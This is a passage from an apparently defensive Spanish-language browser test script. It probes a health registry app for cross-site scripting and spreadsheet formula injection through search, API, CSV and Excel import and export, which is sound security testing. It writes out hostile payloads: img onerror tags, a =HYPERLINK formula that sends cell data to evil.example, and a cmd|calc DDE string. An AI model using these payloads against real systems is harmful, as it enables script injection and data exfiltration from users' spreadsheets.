  await page.fill('#search-input', 'Jr. Bolognesi <u id=xss_pin>pin</u> <img src=x id=xss_pin_img onerror=window.__pwn3=1>');
  await page.press('#search-input', 'Enter');
  await sleep(800);
  const pin = await page.evaluate(() => ({ elem: !!document.getElementById('XSS_PIN'), img: !!document.getElementById('XSS_PIN_IMG'), pwn: window.__pwn3 === undefined ? 'no ejecutado' : 'EJECUTADO', texto: (document.getElementById('XSS_PIN') || {}).textContent }));
  log('Texto escrito por el propio usuario en el buscador → ' + JSON.stringify(pin));

  // =====================================================================================
  log('\n=== PARTE 3d — usuarios con nombre hostil (ADMIN los crea), eventos hostiles, comillas y backticks ===');
  await page.evaluate(() => { document.querySelectorAll('.modal-overlay.active, .reg-modal-overlay.active, .padron-modal-overlay.active').forEach(m => m.classList.remove('active')); window.app.loadInitialData(); });
  await sleep(1500);
  await page.click('#btn-usuarios');
  await page.waitForSelector('#modal-usuarios.active');
  await sleep(1500);
  const us = await page.evaluate(() => ({ elementos: [...document.querySelectorAll('#usuarios-lista [id]')].map(e => e.id).filter(i => /^xss_/i.test(i)), texto: (document.getElementById('usuarios-lista').textContent.match(/<img src=x id=xss_user_nombre[^>]*>/) || ['(no aparece)'])[0] }));
  log(`Lista de usuarios (ADMIN): elementos inyectados = ${us.elementos.length}; el nombre se ve literal = ${us.texto.slice(0, 50)}`);
  await page.keyboard.press('Escape');
  const u2 = await abrir(browser, 'c3.coord', CLAVE);
  const chip = await u2.page.evaluate(() => ({ elementos: [...document.querySelectorAll('[id]')].map(e => e.id).filter(i => /^xss_/i.test(i)), chip: document.getElementById('user-chip-name').textContent, toast: [...document.querySelectorAll('#toast-container .toast')].map(t => t.textContent).find(t => t.includes('Bienvenido')) || '' }));
  log(`Sesión del usuario con nombre hostil: elementos inyectados = ${chip.elementos.length}; chip = ${JSON.stringify(chip.chip)}; aviso = ${JSON.stringify(chip.toast.trim().slice(0, 70))}`);
  await u2.ctx.close();

  // eventos hostiles en la línea de tiempo
  const pid = 'pac-00001741-96100001';
  const ev = [];
  for (const [campo, valor] of [['estado', PAY('ev_estado')], ['detalle', PAY('ev_detalle')], ['tipo', PAY('ev_tipo')], ['establecimiento_id', PAY('ev_est')], ['fecha', PAY('ev_fecha')]]) {
    const body = { tipo: 'control', fecha: '2026-10-01', estado: 'completada', detalle: 'x' };
    body[campo] = valor;
    const r = await api('POST', `/api/patients/${pid}/eventos`, A, body);
    ev.push(`${campo}: ${r.status === 201 ? 'ACEPTA' : 'RECHAZA ' + r.status}`);
  }
  log('Eventos con carga hostil por la API (POST /patients/:id/eventos): ' + ev.join(' · '));
  // el comentario de la pre-cita se muestra en la línea de tiempo (getTimeline: detalle = comentarios de la cita)
  const rp = await api('POST', '/api/appointments/pre-cita', A, { patient_id: pid, fecha_sugerida: '2026-11-20', comentario: PAY('ev_precita') });
  log(`Pre-cita con comentario hostil por la API (POST /appointments/pre-cita): ${rp.status === 200 ? 'ACEPTA' : 'RECHAZA ' + rp.status} (el comentario sale en la ficha como «detalle» del evento de tipo cita)`);
  await page.evaluate(() => window.app.openPatientDetail('pac-00001741-96100001'));
  await sleep(900);
  const tl = await page.evaluate(() => ({ elementos: [...document.querySelectorAll('#ficha-eventos [id]')].map(e => e.id).filter(i => /^xss_/i.test(i)), literal: [...document.getElementById('ficha-eventos').textContent.matchAll(/<u id="(xss_ev_[a-z]+)">/g)].map(m => m[1]), nEventos: document.querySelectorAll('#ficha-eventos .timeline-item').length }));
  log(`Línea de tiempo de la ficha: elementos inyectados = ${tl.elementos.length}; textos hostiles visibles como literal = ${JSON.stringify(tl.literal)}; eventos pintados = ${tl.nEventos}`);

  // comillas, backticks y ampersands en atributos: ida y vuelta exacta
  const raro = 'PACIENTE "COMILLAS" \'SIMPLES\' `BACKTICK` &AMP; &#60;LT; ${X} {{Y}}';
  const rr = await api('POST', '/api/padron/importar-lote', A, { patients: [pacienteBase('96800003', 803, { apellidos_nombres: raro, direccion: raro })] });
  log(`Alta por API de un paciente con comillas, backtick y ampersands en nombre y dirección: HTTP ${rr.status}${rr.status !== 200 ? ' ' + rr.text.slice(0, 120) : ''}`);
  await page.evaluate(() => { window.app.resetFiltros(); return window.app.loadInitialData(); });
  await sleep(1500);
  await page.evaluate(() => document.querySelectorAll('.modal-overlay.active, .reg-modal-overlay.active, .padron-modal-overlay.active, .usuarios-overlay.active').forEach(m => m.classList.remove('active')));
  const rt = await page.evaluate((esperado) => {
    window.app.visibleLimit = 5000; window.app.render();
    const card = [...document.querySelectorAll('#patient-list .patient-card')].find(c => c.querySelector('.patient-name') && c.querySelector('.patient-name').textContent.includes('COMILLAS'));
    if (!card) return { hallado: false };
    const nom = card.querySelector('.patient-name');
    const cab = card.querySelector('.patient-card-header');
    const dir = card.querySelector('.pcard-address');
    return {
      hallado: true,
      textoIgual: nom.textContent === esperado, titleIgual: nom.getAttribute('title') === esperado,
      ariaIgual: cab.getAttribute('aria-label') === 'Abrir ficha clínica de ' + esperado,
      direccionIgual: dir.textContent.trim().endsWith(esperado), titleDireccionIgual: dir.getAttribute('title').startsWith(esperado),
      atributosCabecera: cab.getAttributeNames().join(','), atributosNombre: nom.getAttributeNames().join(',')
    };
  }, raro);
  log(`Nombre con comillas dobles, simples, backtick, &amp;, &#60; y \${…} en lista (texto, title, aria-label): ${JSON.stringify(rt)}`);

  // =====================================================================================
  log('\n=== PARTE 3g — CSV de HOSIX cargado desde la interfaz (queda solo en memoria; no pasa por el servidor, así que no hay defensa del servidor) ===');
  const csvH = ['DNI,NUM_HC,PACIENTE,TELEFONO,DIRECCION,CIE10_COD,PA_SISTOLICA,PA_DIASTOLICA,FEC_PROXIMA_CITA,ESTADO_CONTROL,DISTRITO',
    '96600001,<u id=xss_csv_hc>H</u>,<u id=xss_csv_nombre>NOM</u>,943000111,Jr. Bolognesi <u id=xss_csv_dir>D</u>,I10<u id=xss_csv_cie10>C</u>,150,95,2026-12-01,<u id=xss_csv_estado>E</u>,<u id=xss_csv_distrito>D</u>',
    'X<u id=xss_csv_dni>1</u>,HC2,SEGUNDO CSV,943000112,Jr. Bolognesi 250,I10,130,80,2026-12-01,Controlado,Huarmey'].join('\n');
  const rutaCsv = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'c3csv-')), 'hosix_hostil_inventado.csv');
  fs.writeFileSync(rutaCsv, csvH);
  await page.evaluate(() => { document.querySelectorAll('.modal-overlay.active, .reg-modal-overlay.active, .padron-modal-overlay.active').forEach(m => m.classList.remove('active')); window.app.resetFiltros(); window.app.switchView('mapa'); });
  await page.setInputFiles('#hosix-file-input', rutaCsv);
  await sleep(1500);
  const nuevos = await page.evaluate(() => window.app.patients.filter(p => /xss_csv/i.test(JSON.stringify(p))).map(p => ({ id: p.id, dni: p.dni })));
  const S3 = await superficies(page, nuevos, 'csv');
  const hallados = [...new Set([].concat(S3.res.lista, S3.res.tooltip, S3.res.popup, S3.res.ficha, S3.res.tablero, S3.res.registro))];
  log(`Pacientes del CSV en memoria: ${nuevos.length} (el CSV nunca se envía al servidor); pantallas recorridas: lista, tooltip, popup, ficha, tablero y registro clínico`);
  log(`Campos hostiles del CSV (historia clínica, nombre, dirección, CIE-10, estado de control, distrito, documento): elementos inyectados = ${hallados.length}${hallados.length ? ' → ' + hallados.join(', ') : ''}`);
  const sanidad = await page.evaluate(async () => {
    window.app.visibleLimit = 5000; window.app.render();
    const lista = document.getElementById('patient-list').textContent;
    window.app.openPatientDetail(window.app.patients.find(p => /xss_csv_nombre/i.test(p.apellidos_nombres)).id);
    await new Promise(r => setTimeout(r, 200));
    const ficha = document.getElementById('modal-patient-detail').textContent;
    return { listaMuestraNombreComoTexto: lista.includes('<U ID=XSS_CSV_NOMBRE>'), fichaMuestraNombreComoTexto: ficha.includes('<U ID=XSS_CSV_NOMBRE>'), fichaMuestraCie10ComoTexto: /I10<u id=xss_csv_cie10>/i.test(ficha) };
  });
  log(`Comprobación de que la prueba no es vacía: la lista muestra el nombre hostil como texto = ${sanidad.listaMuestraNombreComoTexto}; la ficha lo muestra como texto = ${sanidad.fichaMuestraNombreComoTexto}; la ficha muestra el CIE-10 hostil como texto = ${sanidad.fichaMuestraCie10ComoTexto}`);
  await page.evaluate(() => { document.querySelectorAll('.modal-overlay.active, .reg-modal-overlay.active').forEach(m => m.classList.remove('active')); window.app.resetFiltros(); return window.app.loadInitialData(); });
  await sleep(1200);

  // =====================================================================================
  log('\n=== PARTE 3e — Excel hostil por la cuadrícula del padrón (importación real desde la interfaz) ===');
  const hostil = (campo) => PAY('xl_' + campo);
  const filaXl = {
    tipo_documento: 'DNI', nro_documento: '96700001', apellidos_nombres: 'PACIENTE C3 EXCEL', sexo: 'Femenino', fecha_nacimiento: '1960-05-10', seguro_salud: 'SIS',
    sector: 'Sector I – Centro', direccion: hostil('direccion'), establecimiento_adscripcion: H, establecimiento_control: H,
    cie10_hta: 'I10.X – Hipertensión esencial (primaria)', tratamiento_hta: hostil('tratamiento_hta'), tratamiento_dm: hostil('tratamiento_dm'), observaciones: hostil('observaciones'),
    actualizado_por: hostil('actualizado_por'), pas_oct: 150, pad_oct: 95,
    fecha_ultimo_control: '2026-10-20', proxima_cita: '2026-11-25', estado_paciente: 'Activo', consentimiento: 'No'
  };
  // segunda fila: los campos que el SERVIDOR rechaza (nombre, historia clínica, teléfono, CIE-10 con < >)
  const filaRechazada = Object.assign({}, filaXl, { nro_documento: '96700002', apellidos_nombres: 'PACIENTE C3 <IMG SRC=X ID=XSS_XL_NOMBRE>', historia_clinica: hostil('historia_clinica'),
    telefono: hostil('telefono'), cie10_dm: hostil('cie10_dm'), direccion: 'Jr. Bolognesi 250 Huarmey' });
  const libro = filas => {
    const f = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'c3-')), 'padron_hostil_inventado.xlsx');
    fs.writeFileSync(f, XLSX.write(exp.construirLibro(XLSX, filas), { type: 'buffer', bookType: 'xlsx' }));
    return f;
  };
  const cargarEnGrilla = async (archivo, etiqueta) => {
    await page.evaluate(() => { window.PadronGridModal.patients = []; document.querySelectorAll('.padron-modal-overlay.active').forEach(m => m.classList.remove('active')); window.app.switchView('mapa'); });
    const [fc] = await Promise.all([page.waitForEvent('filechooser'), page.click('#rail-tab-excel')]);
    await fc.setFiles(archivo);
    await page.waitForSelector('#modal-padron-grid.active #padron-grid-tbody tr');
    await sleep(500);
    const g = await page.evaluate(`(() => {
      const m = document.getElementById('modal-padron-grid');
      return { elementos: [...m.querySelectorAll('[id]')].map(e => e.id).filter(i => /^xss_/i.test(i)), filas: m.querySelectorAll('#padron-grid-tbody tr').length,
        pills: m.querySelectorAll('.padron-error-pill').length, literal: /<u id="xss_xl_|<IMG SRC=X ID=XSS_XL/i.test(m.querySelector('#padron-grid-tbody').textContent),
        habilitado: !document.getElementById('padron-btn-cargar').disabled,
        errores: (window.PadronGridModal.validationResult.rowResults[0] ? Object.keys(window.PadronGridModal.validationResult.rowResults[0].errors || {}) : []) };
    })()`);
    log(`[${etiqueta}] cuadrícula: elementos inyectados = ${g.elementos.length}; filas = ${g.filas}; píldoras de error = ${g.pills}; carga hostil visible como texto = ${g.literal}; botón «Cargar» habilitado = ${g.habilitado}; campos que el validador de la cuadrícula observa: ${g.errores.join(', ') || 'ninguno'}`);
    return g;
  };
  // 1) campos de texto libre que el servidor acepta
  await cargarEnGrilla(libro([filaXl]), 'fila con direccion, tratamiento, observaciones, actualizado_por hostiles');
  await page.evaluate(() => { const c = document.querySelector('#padron-grid-tbody td[data-key="direccion"]'); if (c) c.click(); });
  await sleep(200);
  await page.evaluate(() => { const i = document.querySelector('#padron-grid-tbody input.grid-inline-input'); if (i) i.dispatchEvent(new KeyboardEvent('keydown', { key: 'Escape' })); });
  await sleep(200);
  const trasEdit = await page.evaluate(() => [...document.getElementById('modal-padron-grid').querySelectorAll('[id]')].map(e => e.id).filter(i => /^xss_/i.test(i)).length);
  log(`Tras entrar y salir de la edición de una celda (Esc en el campo; restituye el HTML con innerHTML = oldHtml): elementos inyectados = ${trasEdit}`);
  await page.click('#padron-btn-cargar');
  await sleep(2500);
  const guard = (await api('GET', '/api/cronicos', A)).json.find(x => x.dni === '96700001');
  log(`Servidor tras cargar desde la interfaz: ${guard ? 'GUARDÓ al paciente (direccion = ' + JSON.stringify((guard.direccion || '').slice(0, 34)) + ')' : 'no guardó el paciente'}`);
  if (guard) {
    const tras = await page.evaluate(`(async () => {
      await window.app.loadInitialData();
      window.app.resetFiltros(); window.app.visibleLimit = 5000; window.app.render();
      window.app.openPatientDetail('pac-00001741-96700001');
      await new Promise(r => setTimeout(r, 500));
      const ficha = document.getElementById('modal-patient-detail');
      window.RegistroClinicoModal.open('96700001');
      await new Promise(r => setTimeout(r, 300));
      const ids = [...document.querySelectorAll('[id]')].map(e => e.id).filter(i => /^xss_xl/i.test(i));
      const lits = [...ficha.textContent.matchAll(/<u id="(xss_xl_[a-z_0-9]+)">/g)].map(m => m[1]);
      return { elementos: ids, escapados: lits };
    })()`);
    log(`Valores del Excel hostil ya guardados, vistos en lista, ficha y registro clínico: elementos inyectados = ${tras.elementos.length}; se ven como texto en la ficha = ${JSON.stringify(tras.escapados)}`);
  }
  await page.evaluate(() => document.querySelectorAll('.modal-overlay.active, .reg-modal-overlay.active, .padron-modal-overlay.active').forEach(m => m.classList.remove('active')));
  // 2) los campos que el servidor rechaza: la cuadrícula los deja pasar, el servidor corta el lote y la interfaz muestra su mensaje
  await cargarEnGrilla(libro([filaRechazada]), 'fila con nombre, historia clínica, teléfono y CIE-10 con < >');
  await page.click('#padron-btn-cargar');
  await sleep(2500);
  const aviso = await page.evaluate(() => [...document.querySelectorAll('#toast-container .toast')].map(t => t.textContent.trim()).filter(t => /servidor/i.test(t)).pop() || '(sin aviso)');
  const guard2 = (await api('GET', '/api/cronicos', A)).json.find(x => x.dni === '96700002');
  const elemTras = await page.evaluate(() => [...document.querySelectorAll('[id]')].map(e => e.id).filter(i => /^xss_xl/i.test(i) || /^XSS_XL/i.test(i)).length);
  log(`El servidor rechaza el lote (no guardó = ${!guard2}); aviso en pantalla: «${aviso.slice(0, 150)}»; elementos inyectados en la página = ${elemTras}`);
  await page.evaluate(() => { document.querySelectorAll('.padron-modal-overlay.active').forEach(m => m.classList.remove('active')); window.PadronGridModal.patients = []; });

  // =====================================================================================
  log('\n=== PARTE 3f — CSV de pre-citas y Excel exportado: inyección de fórmulas ===');
  const formulas = pacienteBase('96800004', 804, { apellidos_nombres: "=HYPERLINK(\"http://evil.example/?x=\"&A1,\"clic\")", direccion: "@SUM(1+1)*cmd|' /C calc'!A0", historia_clinica: '+1+1', telefono: '-2+3', otras_patologias: '=1+1', tratamiento_hta: '\t=1+1' });
  const rf = await api('POST', '/api/padron/importar-lote', A, { patients: [formulas] });
  log(`Paciente con nombre, dirección, HC y teléfono que empiezan con = @ + - TAB: servidor ${rf.status === 200 ? 'ACEPTA' : 'RECHAZA ' + rf.status}`);
  await page.evaluate(() => { window.app.resetFiltros(); return window.app.loadInitialData(); });
  await sleep(1500);
  await page.evaluate(() => { window.AlertsManager.precitas = []; window.app.abrirModalPreCita('pac-00001741-96800004'); });
  await page.evaluate(() => document.querySelector('[data-accion="confirmarPreCita"]').click());
  await sleep(1200);
  const csv = await page.evaluate(() => window.AlertsManager.exportarCsvParaHosix());
  const lineas = (csv || '').split('\n');
  const celdas = (lineas[1] || '').split('","').map(c => c.replace(/^"|"$/g, ''));
  log('Celdas del CSV de pre-citas (DNI, HC, PACIENTE, TELEFONO, DIRECCION): ' + JSON.stringify([celdas[1], celdas[2], celdas[3], celdas[4], celdas[5]]));
  log(`Celdas del CSV que todavía empiezan con = + - @ TAB CR: ${celdas.filter(c => /^[=+\-@\t\r]/.test(c)).length}`);
  // descarga real por el botón (el archivo que recibe el usuario)
  await page.evaluate(() => { document.querySelectorAll('.modal-overlay.active').forEach(m => m.classList.remove('active')); window.app.switchView('mapa'); window.app.toggleHeartsPanel(true); window.app.switchHeartsTab('ingesta'); });
  const [dl] = await Promise.all([page.waitForEvent('download', { timeout: 8000 }).catch(() => null), page.evaluate(() => document.getElementById('btn-export-precitas').click())]);
  if (dl) {
    const ruta = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'c3-')), 'precitas.csv');
    await dl.saveAs(ruta);
    const filas = fs.readFileSync(ruta, 'utf8').split('\n').slice(1);
    const peligro = filas.some(l => l.split('","').some(c => /^"?[=+\-@\t\r]/.test(c)));
    log(`Archivo descargado «${dl.suggestedFilename()}»: ${filas.length} fila(s) de datos; alguna celda empieza con = + - @ TAB CR = ${peligro}`);
  } else log('Descarga del CSV: no se capturó');

  // Excel exportado: las celdas hostiles deben ser texto, no fórmulas (<f>); se comprueba el XML y, con LibreOffice, la lectura real
  const [dx] = await Promise.all([page.waitForEvent('download', { timeout: 10000 }).catch(() => null), page.evaluate(() => window.app.exportarPadronExcel())]);
  if (dx) {
    const ruta = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'c3-')), 'padron.xlsx');
    await dx.saveAs(ruta);
    const sh = require('child_process').spawnSync('unzip', ['-p', ruta, 'xl/worksheets/sheet2.xml']);
    const xml = sh.stdout ? sh.stdout.toString() : '';
    const formulasXml = [...xml.matchAll(/<f>([^<]*)<\/f>/g)].map(m => m[1]);
    const hostilEnF = formulasXml.filter(f => /HYPERLINK|evil|cmd\||A0/i.test(f)).length;
    const celdaHostil = (xml.match(/<c r="[A-Z]+\d+" t="(?:str|s|inlineStr)"[^>]*><(?:v|is)>[^<]*HYPERLINK[^<]*/) || [''])[0].replace(/\s+/g, ' ').slice(0, 90);
    log(`Excel exportado «${dx.suggestedFilename()}»: ${formulasXml.length} fórmulas <f> en la hoja Padrón, todas de la plantilla (ROW(), IF(), DATEDIF()…); fórmulas que contienen la carga hostil = ${hostilEnF}`);
    log(`Celda con el nombre hostil en el XML: ${celdaHostil.replace(/&quot;/g, '"')}…  (tipo texto, sin <f>)`);
    const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'c3lo-'));
    const lo = require('child_process').spawnSync('soffice', ['--headless', '--norestore', `-env:UserInstallation=file://${tmp}/perfil`, '--convert-to', 'csv:Text - txt - csv (StarCalc):44,34,76,1,,0,false,true,false,false,false,2', '--outdir', tmp, ruta], { timeout: 120000 });
    const leido = require('child_process').spawnSync('sh', ['-c', `cat "${tmp}"/*.csv`]);
    const textoLo = leido.stdout ? leido.stdout.toString('utf8') : '';
    if (lo.error || !textoLo) log('LibreOffice no disponible: se omite la lectura real del Excel exportado.');
    else {
      const texto = textoLo;
      const evaluada = /clic/.test(texto) && !/HYPERLINK/.test(texto);
      log(`LibreOffice (abre el .xlsx exportado y lo convierte a CSV): la celda sigue siendo texto literal «=HYPERLINK(…)» = ${/=HYPERLINK\(""http:\/\/evil\.example/.test(texto)}; fue evaluada como fórmula = ${evaluada}`);
    }
  } else log('Descarga del Excel: no se capturó');

  log('\n=== RESUMEN A2 ===');
  log(`Ruta real (API → servidor → pantalla), 46 campos aceptados de 67 probados: elementos inyectados = ${inyectados1.length} → ${inyectados1.join('; ') || 'ninguno'}`);
  log(`En memoria (si el servidor dejara pasar el dato): ${inyectados2.concat(var1.ids.map(x => x.replace('pac-mem-2:xss_', '') + ' → ficha (paciente fallecido)')).join('; ')}`);
  log(`Autoinyección (el usuario se escribe a sí mismo): pin de búsqueda → elemento = ${pin.elem}, script ejecutado = ${pin.pwn !== 'no ejecutado'}`);
  log('Sin elemento inyectado en: lista, tooltip, popup, ficha, tablero, registro clínico, línea de tiempo, usuarios, chip, cuadrícula del padrón, CSV de HOSIX y mensajes del servidor (resto de los campos y sumideros).');
  log('\nErrores de página (excepciones no capturadas): ' + JSON.stringify(page.errores));
  log('Violaciones de CSP en la sesión principal: ' + JSON.stringify(await page.evaluate(() => window.__csp)));
  await browser.close();
  fs.writeFileSync(path.join(__dirname, 'out_A2_sumideros_navegador.txt'), out.join('\n').replace(new RegExp(process.env.ADMIN_PASSWORD || 'x', 'g'), '***') + '\n');
})().catch(e => { console.error('ERROR', e.stack.split('\n').slice(0, 4).join('\n')); fs.writeFileSync(path.join(__dirname, 'out_A2_sumideros_navegador.txt'), out.join('\n') + '\nERROR ' + e.message + '\n'); process.exit(1); });
